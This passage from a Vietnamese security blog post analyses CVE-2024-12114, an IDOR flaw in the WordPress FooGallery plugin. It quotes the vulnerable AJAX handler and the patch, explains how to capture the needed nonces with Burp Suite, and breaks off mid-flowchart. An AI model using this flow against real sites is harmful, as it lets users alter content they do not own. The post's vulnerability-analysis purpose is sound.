Type&lt;/strong&gt;: Insecure Direct Object References (IDOR)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 2.4.29&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 2.4.30&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Low (4.3)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: N/A&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/foogallery/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress FooGallery Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;FooGallery&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;2.4.29&lt;/code&gt; ‚Äì &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;2.4.30&lt;/code&gt; ‚Äì &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; ‚Üí &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• diff n√†o.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;div class=&#34;details admonition info open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-circle-info&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Th√¥ng tin&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;Theo m√¥ t·∫£ c√∫a CVE, t√°c ƒë·ªông th·ª±c s·ª± ch·ªâ x·∫£y ra khi &lt;strong&gt;thi·∫øt l·∫≠p vai tr√≤ Gallery Creator&lt;/strong&gt; ƒë∆∞·ª£c ƒë·∫∑t ·ªü m·ª©c &lt;strong&gt;th·∫•p h∆°n ‚ÄúEditor‚Äù&lt;/strong&gt;.&#xA;B·∫°n c√≥ th·ªÉ thi·∫øt l·∫≠p n√≥ ·ªü ƒë√¢y:&#xA;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-30-cve-2024-12114/role.png&#34; title=&#34;Gallery Creator role&#34; data-thumbnail=&#34;/posts/2025-12-30-cve-2024-12114/role.png&#34; data-sub-html=&#34;&lt;h2&gt;Role&lt;/h2&gt;&lt;p&gt;Gallery Creator role&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-30-cve-2024-12114/role.png&#39; alt=&#34;Role&#34; height=&#34;882&#34; width=&#34;1382&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Gallery Creator role&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&#xA;Khi ƒë√≥, user c√≥ vai tr√≤ n√†y s·∫Ω c√≥ th·ªÉ d√πng ch·ª©c nƒÉng &lt;strong&gt;Add&lt;/strong&gt;/&lt;strong&gt;Edit&lt;/strong&gt; Gallery:&#xA;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-30-cve-2024-12114/create.png&#34; title=&#34;Create/Add&#34; data-thumbnail=&#34;/posts/2025-12-30-cve-2024-12114/create.png&#34; data-sub-html=&#34;&lt;h2&gt;Create/Add&lt;/h2&gt;&lt;p&gt;Create/Add&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-30-cve-2024-12114/create.png&#39; alt=&#34;Create/Add&#34; height=&#34;829&#34; width=&#34;1919&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Create/Add&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin ƒëƒÉng k√Ω AJAX handler &lt;strong&gt;cho ng∆∞·ªùi d√πng ƒë√£ ƒëƒÉng nh·∫≠p&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_action( &amp;#39;wp_ajax_foogallery_attachment_modal_save&amp;#39;, array( $this, &amp;#39;ajax_save_modal&amp;#39; ) );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;wp_ajax_&lt;/code&gt; l√† hook d√†nh cho ng∆∞·ªùi d√πng ƒë√£ ƒëƒÉng nh·∫≠p (Subcriber+). Khi c√≥ request t·ªõi endpoint &lt;code&gt;/wp-admin/admin-ajax.php&lt;/code&gt; v·ªõi param &lt;code&gt;action=foogallery_attachment_modal_save&lt;/code&gt; th√¨ callback &lt;code&gt;ajax_save_modal&lt;/code&gt; ƒë∆∞·ª£c g·ªçi:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function ajax_save_modal() {&#xA;    $foogallery = ( isset( $_POST[&amp;#39;foogallery&amp;#39;] ) ? $_POST[&amp;#39;foogallery&amp;#39;] : array() );&#xA;&#xA;    if ( !is_array( $foogallery ) || empty( $foogallery ) ) {&#xA;        return;&#xA;    }&#xA;&#xA;    // Check for nonce security      &#xA;    if ( ! wp_verify_nonce( $_POST[&amp;#39;nonce&amp;#39;], &amp;#39;foogallery-modal-nonce&amp;#39; ) ) {&#xA;        die ( &amp;#39;Busted!&amp;#39;);&#xA;    }&#xA;&#xA;    $img_id = intval( sanitize_text_field( $_POST[&amp;#39;img_id&amp;#39;] ) );&#xA;&#xA;    if ( $img_id &amp;gt; 0 ) {&#xA;        do_action( &amp;#39;foogallery_attachment_save_data&amp;#39;, $img_id, $foogallery );&#xA;    }&#xA;    &#xA;    wp_die();&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;H√†m l·∫•y &lt;code&gt;foogallery&lt;/code&gt; t·ª´ request, ki·ªÉm tra n·∫øu l√† m·ªôt m·∫£ng c√≥ gi√° tr·ªã th√¨ ti·∫øp t·ª•c ki·ªÉm tra &lt;code&gt;nonce&lt;/code&gt; ƒë·∫£m b·∫£o request h·ª£p l·ªá:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( ! wp_verify_nonce( $_POST[&amp;#39;nonce&amp;#39;], &amp;#39;foogallery-modal-nonce&amp;#39; ) ) {&#xA;    die ( &amp;#39;Busted!&amp;#39;);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;H√†m &lt;code&gt;wp_verify_nonce()&lt;/code&gt; s·∫Ω ki·ªÉm tra gi√° tr·ªã &lt;code&gt;nonce&lt;/code&gt; g·ª≠i l√™n c√≥ h·ª£p l·ªá (&lt;code&gt;nonce&lt;/code&gt; ƒë∆∞·ª£c t·∫°o b·ªüi action &lt;code&gt;foogallery-modal-nonce&lt;/code&gt;) hay kh√¥ng.&lt;/p&gt;&#xA;&lt;p&gt;N·∫øu h·ª£p l·ªá v√† &lt;code&gt;img_id &amp;gt; 0&lt;/code&gt;, &lt;code&gt;do_action(&#39;foogallery_attachment_save_data&#39;,...)&lt;/code&gt; ƒëu·ª£c g·ªçi v·ªõi gi√° tr·ªã c·ªßa &lt;code&gt;img_id&lt;/code&gt; v√† &lt;code&gt;foogallery&lt;/code&gt; t·ª´ request.&lt;/p&gt;&#xA;&lt;p&gt;Tr∆∞·ªõc ƒë√≥, plugin ƒë√£ ƒëƒÉng k√Ω m·ªôt lo·∫°t c√°c callback cho action &lt;code&gt;foogallery_attachment_save_data&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-30-cve-2024-12114/add_action.png&#34; title=&#34;C√°c callback ƒë∆∞·ª£c ƒëƒÉng k√Ω cho action foogallery_attachment_save_data&#34; data-thumbnail=&#34;/posts/2025-12-30-cve-2024-12114/add_action.png&#34; data-sub-html=&#34;&lt;h2&gt;Add action&lt;/h2&gt;&lt;p&gt;C√°c callback ƒë∆∞·ª£c ƒëƒÉng k√Ω cho action foogallery_attachment_save_data&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-30-cve-2024-12114/add_action.png&#39; alt=&#34;Add action&#34; height=&#34;521&#34; width=&#34;1913&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;C√°c callback ƒë∆∞·ª£c ƒëƒÉng k√Ω cho action foogallery_attachment_save_data&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function foogallery_attachment_save_data_main( $img_id, $data ) {&#xA;&#xA;    if ( is_array( $data ) &amp;amp;&amp;amp; !empty( $data ) ) {&#xA;&#xA;        $foogallery_post = array(&#xA;            &amp;#39;ID&amp;#39; =&amp;gt; $img_id&#xA;        );&#xA;&#xA;        if ( array_key_exists( &amp;#39;title&amp;#39;, $data ) ) {&#xA;            $foogallery_post[&amp;#39;post_title&amp;#39;] = $data[&amp;#39;title&amp;#39;];&#xA;        }&#xA;&#xA;        if ( array_key_exists( &amp;#39;caption&amp;#39;, $data ) ) {&#xA;            $foogallery_post[&amp;#39;post_excerpt&amp;#39;] = $data[&amp;#39;caption&amp;#39;];&#xA;        }&#xA;&#xA;        if ( array_key_exists( &amp;#39;description&amp;#39;, $data ) ) {&#xA;            $foogallery_post[&amp;#39;post_content&amp;#39;] = $data[&amp;#39;description&amp;#39;];&#xA;        }&#xA;&#xA;        // Update post meta values&#xA;        if ( array_key_exists( &amp;#39;alt-text&amp;#39;, $data ) ) {&#xA;            update_post_meta( $img_id, &amp;#39;_wp_attachment_image_alt&amp;#39;, $data[&amp;#39;alt-text&amp;#39;] );&#xA;        }&#xA;&#xA;        if ( array_key_exists( &amp;#39;custom-url&amp;#39;, $data ) ) {&#xA;            update_post_meta( $img_id, &amp;#39;_foogallery_custom_url&amp;#39;, $data[&amp;#39;custom-url&amp;#39;] );&#xA;        }&#xA;&#xA;        if ( array_key_exists( &amp;#39;custom-target&amp;#39;, $data ) ) {&#xA;            update_post_meta( $img_id, &amp;#39;_foogallery_custom_target&amp;#39;, $data[&amp;#39;custom-target&amp;#39;] );&#xA;        }&#xA;&#xA;        if ( array_key_exists( &amp;#39;custom-class&amp;#39;, $data ) ) {&#xA;            update_post_meta( $img_id, &amp;#39;_foogallery_custom_class&amp;#39;, $data[&amp;#39;custom-class&amp;#39;] );&#xA;        }&#xA;&#xA;        if ( is_array( $foogallery_post ) &amp;amp;&amp;amp; count( $foogallery_post ) &amp;gt; 1 ) {&#xA;            // Update the post into the database&#xA;            wp_update_post( $foogallery_post );&#xA;        }&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;public function foogallery_attachment_save_data_taxonomies( $img_id, $data ) {&#xA;    if ( is_array( $data ) &amp;amp;&amp;amp; !empty( $data ) ) {&#xA;&#xA;        if ( !$this-&amp;gt;attachments_have_taxonomies() ) {&#xA;            return;&#xA;        }&#xA;&#xA;        if ( array_key_exists( &amp;#39;taxonomies&amp;#39;, $data ) ) {&#xA;            foreach ( $data[&amp;#39;taxonomies&amp;#39;] as $taxonomy =&amp;gt; $taxonomy_value ) {&#xA;                $terms = explode( &amp;#39;,&amp;#39;, $taxonomy_value );&#xA;                if ( is_array( $terms ) ) {&#xA;                    $terms = array_map( &amp;#39;intval&amp;#39;, $terms );&#xA;                    wp_set_object_terms( $img_id, $terms, $taxonomy, false );&#xA;                }&#xA;            }&#xA;        }&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;public function foogallery_attachment_save_data_thumbnails( $img_id, $data ) {&#xA;    if ( is_array( $data ) &amp;amp;&amp;amp; !empty( $data ) ) {&#xA;&#xA;        if ( array_key_exists( &amp;#39;crop_pos&amp;#39;, $data ) ) {&#xA;            update_post_meta( $img_id, &amp;#39;foogallery_crop_pos&amp;#39;, $data[&amp;#39;crop_pos&amp;#39;] );&#xA;        }&#xA;&#xA;        if ( array_key_exists( &amp;#39;override-thumbnail-id&amp;#39;, $data ) ) {&#xA;            update_post_meta( $img_id, &amp;#39;foogallery_override_thumbnail&amp;#39;, $data[&amp;#39;override-thumbnail-id&amp;#39;] );&#xA;        }&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;public function foogallery_attachment_save_data_advanced($img_id, $data ) {&#xA;    if ( is_array( $data ) &amp;amp;&amp;amp; !empty( $data ) ) {&#xA;        if ( array_key_exists( &amp;#39;data-width&amp;#39;, $data ) ) {&#xA;            update_post_meta( $img_id, &amp;#39;_data-width&amp;#39;, $data[&amp;#39;data-width&amp;#39;] );&#xA;        }&#xA;&#xA;        if ( array_key_exists( &amp;#39;data-height&amp;#39;, $data ) ) {&#xA;            update_post_meta( $img_id, &amp;#39;_data-height&amp;#39;, $data[&amp;#39;data-height&amp;#39;] );&#xA;        }&#xA;&#xA;        if ( array_key_exists( &amp;#39;panning&amp;#39;, $data ) ) {&#xA;            update_post_meta( $img_id, &amp;#39;_foobox_panning&amp;#39;, $data[&amp;#39;panning&amp;#39;] );&#xA;        }&#xA;&#xA;        if ( array_key_exists( &amp;#39;override_type&amp;#39;, $data ) ) {&#xA;            update_post_meta( $img_id, &amp;#39;_foogallery_override_type&amp;#39;, $data[&amp;#39;override_type&amp;#39;] );&#xA;        }&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;C√°c callback th·ª±c hi·ªán m·ªôt lo·∫°t c√°c update v·ªõi gallery t∆∞∆°ng ·ª©ng v·ªõi &lt;code&gt;img_id&lt;/code&gt; v√† d·ªØ li·ªáu l√† &lt;code&gt;foogallery&lt;/code&gt;, t·∫•t c·∫£ ƒë·ªÅu c√≥ th·ªÉ ƒë∆∞·ª£c ki·ªÉm so√°t b·ªüi attacker.&lt;/p&gt;&#xA;&lt;p&gt;L·ªó h·ªïng IDOR x·∫£y ra v√¨ kh√¥ng c√≥ r√†ng bu·ªôc n√†o ƒë·ªëi v·ªõi gallery t∆∞∆°ng ·ª©ng &lt;code&gt;img_id&lt;/code&gt; khi·∫øn k·∫ª t·∫•n c√¥ng c√≥ th·ªÉ g·ª≠i request t√πy √Ω ƒë·ªÉ ch·ªânh s·ª≠a n·ªôi dung gallery kh√¥ng thu·ªôc quy·ªÅn c·ªßa m√¨nh.&lt;/p&gt;&#xA;&lt;p&gt;B·∫£n v√° &lt;code&gt;v2.4.30&lt;/code&gt; ƒë√£ th√™m r√†ng bu·ªôc:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( current_user_can(&amp;#39;edit_post&amp;#39;, $img_id ) ) {&#xA;    do_action( &amp;#39;foogallery_attachment_save_data&amp;#39;, $img_id, $foogallery );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-30-cve-2024-12114/patch.png&#34; title=&#34;B·∫£n v√°&#34; data-thumbnail=&#34;/posts/2025-12-30-cve-2024-12114/patch.png&#34; data-sub-html=&#34;&lt;h2&gt;Patch&lt;/h2&gt;&lt;p&gt;B·∫£n v√°&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-30-cve-2024-12114/patch.png&#39; alt=&#34;Patch&#34; height=&#34;470&#34; width=&#34;1814&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;B·∫£n v√°&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Ch·ªâ ng∆∞·ªùi d√πng c√≥ quy·ªÅn &lt;code&gt;edit_post&lt;/code&gt; v·ªõi id &lt;code&gt;$img_id&lt;/code&gt; th√¨ m·ªõi ƒë∆∞·ª£c ph√©p g·ªçi ƒë·∫øn action &lt;code&gt;foogallery_attachment_save_data&lt;/code&gt; ƒë·ªÉ ch·ªânh s∆∞a n√≥.&lt;/p&gt;&#xA;&lt;hr&gt;&#xA;&lt;p&gt;ƒêi·ªÅu ti√™n quy·∫øt l√† c·∫ßn t√¨m c√°ch ƒë·ªÉ l·∫•y ƒë∆∞·ª£c gi√° tr·ªã c·ªßa nonce t∆∞∆°ng ·ª©ng v·ªõi action &lt;code&gt;foogallery-modal-nonce&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-30-cve-2024-12114/create_nonce.png&#34; title=&#34;X√¢y d·ª±ng nonce v·ªõi action foogallery-modal-nonce&#34; data-thumbnail=&#34;/posts/2025-12-30-cve-2024-12114/create_nonce.png&#34; data-sub-html=&#34;&lt;h2&gt;Create nonce&lt;/h2&gt;&lt;p&gt;X√¢y d·ª±ng nonce v·ªõi action foogallery-modal-nonce&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-30-cve-2024-12114/create_nonce.png&#39; alt=&#34;Create nonce&#34; height=&#34;464&#34; width=&#34;1730&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;X√¢y d·ª±ng nonce v·ªõi action foogallery-modal-nonce&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Nonce ƒë∆∞·ª£c kh·ªüi t·∫°o trong h√†m &lt;code&gt;build_modal_data()&lt;/code&gt; b·∫±ng c√°ch g·ªçi &lt;code&gt;wp_create_nonce( &#39;foogallery-modal-nonce&#39; )&lt;/code&gt; v√† n·∫øu ƒë√°p ·ª©ng 2 ƒëi·ªÅu ki·ªán:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;$data&lt;/code&gt; l√† m·ªôt m·∫£ng&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;img_id&lt;/code&gt; v√† &lt;code&gt;gallery_id&lt;/code&gt; kh√°c &lt;code&gt;null&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;H√†m &lt;code&gt;build_modal_data&lt;/code&gt; s·∫Ω tr·∫£ v·ªÅ m·∫£ng c√≥ ch·ª©a gi√° tr·ªã bao g·ªìm &lt;code&gt;nonce&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-30-cve-2024-12114/embed_nonce.png&#34; title=&#34;Gi√° tr·ªã c·ªßa nonce ƒë∆∞·ª£c th√™m v√†o HTML&#34; data-thumbnail=&#34;/posts/2025-12-30-cve-2024-12114/embed_nonce.png&#34; data-sub-html=&#34;&lt;h2&gt;Embed nonce&lt;/h2&gt;&lt;p&gt;Gi√° tr·ªã c·ªßa nonce ƒë∆∞·ª£c th√™m v√†o HTML&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-30-cve-2024-12114/embed_nonce.png&#39; alt=&#34;Embed nonce&#34; height=&#34;961&#34; width=&#34;1372&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Gi√° tr·ªã c·ªßa nonce ƒë∆∞·ª£c th√™m v√†o HTML&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Gi√° tr·ªã n√†y ƒë∆∞·ª£c h√†m &lt;code&gt;ajax_open_modal&lt;/code&gt; s·ª≠ d·ª•ng, &lt;code&gt;nonce&lt;/code&gt; s·∫Ω ƒë∆∞·ª£c th√™m v√†o HTML v·ªõi form id l√† &lt;code&gt;foogallery_attachment_modal_save_form&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;Nh∆∞ng tr∆∞·ªõc ƒë√≥, &lt;code&gt;ajax_open_modal&lt;/code&gt; s·∫Ω th·ª±c hi·ªán ki·ªÉm tra nonce t∆∞∆°ng ·ª©ng v·ªõi action &lt;code&gt;foogallery_attachment_modal_open&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( ! wp_verify_nonce( $_POST[&amp;#39;nonce&amp;#39;], &amp;#39;foogallery_attachment_modal_open&amp;#39; ) ) {&#xA;    die ( &amp;#39;Busted!&amp;#39;);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-30-cve-2024-12114/create_nonce1.png&#34; title=&#34;X√¢y d·ª±ng nonce v·ªõi action foogallery_attachment_modal_open&#34; data-thumbnail=&#34;/posts/2025-12-30-cve-2024-12114/create_nonce1.png&#34; data-sub-html=&#34;&lt;h2&gt;Create nonce&lt;/h2&gt;&lt;p&gt;X√¢y d·ª±ng nonce v·ªõi action foogallery_attachment_modal_open&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-30-cve-2024-12114/create_nonce1.png&#39; alt=&#34;Create nonce&#34; height=&#34;1067&#34; width=&#34;1918&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;X√¢y d·ª±ng nonce v·ªõi action foogallery_attachment_modal_open&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;ƒê·ªçc logic c·ªßa h√†m, ta th·∫•y nonce s·∫Ω ƒë∆∞·ª£c th√™m v√†o HTML c·ªßa &lt;strong&gt;edit gallery&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;S·ª≠ d·ª•ng ch·ª©c nƒÉng &lt;strong&gt;edit gallery&lt;/strong&gt; =&amp;gt; cho request qua BurpSuite =&amp;gt; Filter request v·ªõi t·ª´ kh√≥a &lt;code&gt;foogallery-image-edit-modal&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-30-cve-2024-12114/data_nonce.png&#34; title=&#34;Gi√° tr·ªã c·ªßa nonce trong khi filter&#34; data-thumbnail=&#34;/posts/2025-12-30-cve-2024-12114/data_nonce.png&#34; data-sub-html=&#34;&lt;h2&gt;Data nonce&lt;/h2&gt;&lt;p&gt;Gi√° tr·ªã c·ªßa nonce trong khi filter&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-30-cve-2024-12114/data_nonce.png&#39; alt=&#34;Data nonce&#34; height=&#34;532&#34; width=&#34;956&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Gi√° tr·ªã c·ªßa nonce trong khi filter&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Ta l·∫•y ƒë∆∞·ª£c gi√° tr·ªã c·ªßa nonce n√†y&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;flowchart TD&#xA;A[&amp;#34;Authenticated User (Subscriber&amp;#43;)&amp;#34;] &#xA;--&amp;gt; B[&amp;#34;Request admin-ajax.php?action=foogallery_attachment_modal_open&amp;#34;]&#xA;&#xA;B --&amp;gt; C[&amp;#34;Verify nonce: foogallery_attachment_modal_open&amp;#34;]&#xA;&#xA;C --&amp;gt; D[&amp;#34;Return HTML modal &amp;#43; embedded nonce (foogallery-modal-nonce)&amp;#34;]&#xA;&#xA;D --&amp;gt; E[&amp;#34;User extracts nonce from response&amp;#34;]&#xA;&#xA;E --&amp;gt; F[&amp;#34;Send request: action=foogallery_attachment_modal_save&amp;#34;]&#xA;&#xA;F --&amp;gt; G[&amp;#34;Verify nonce: 